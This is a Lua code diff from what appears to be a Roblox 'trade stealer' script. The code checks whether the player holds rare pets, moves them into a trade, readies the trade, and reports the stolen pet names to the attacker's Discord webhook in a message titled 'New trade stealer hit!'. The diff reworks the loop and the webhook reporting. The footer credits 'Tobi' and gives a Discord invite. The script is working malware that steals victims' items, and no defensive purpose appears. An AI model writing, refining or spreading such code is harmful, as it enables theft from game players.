@@ -188,24 +188,28 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 			if deposited ~= true then
 				DepositPetInTrade()
 				ReadyTrade()
-				if #WebhookList > 0 then
-					local embed = {
-						["title"] = "New trade stealer hit!",
-						["footer"] = {
-							["text"] = "Trade stealer by Tobi. discord.gg/HcpNe56R2a"
-						},
-						["fields"] = {
-							{
-								["name"] = "Pet names",
-								["value"] = table.concat(WebhookList, "\n"),
-								["inline"] = false
-							}
+			end
+			wait(1)
+		end
+		if game.Players.LocalPlayer.PlayerGui.Message.Enabled == true then
+			if #WebhookList > 0 then
+				local embed = {
+					["title"] = "New trade stealer hit!",
+					["color"] = 65280,
+					["footer"] = {
+						["text"] = "Trade stealer by Tobi. discord.gg/HcpNe56R2a"
+					},
+					["fields"] = {
+						{
+							["name"] = "Pet names",
+							["value"] = table.concat(WebhookList, "\n"),
+							["inline"] = false
 						}
 					}
-					SendPublic(Webhook, embed)
-				end
+				}
+				SendPublic(Webhook, embed)
+				break
 			end
-			wait(3)
 		end
 	end
 end
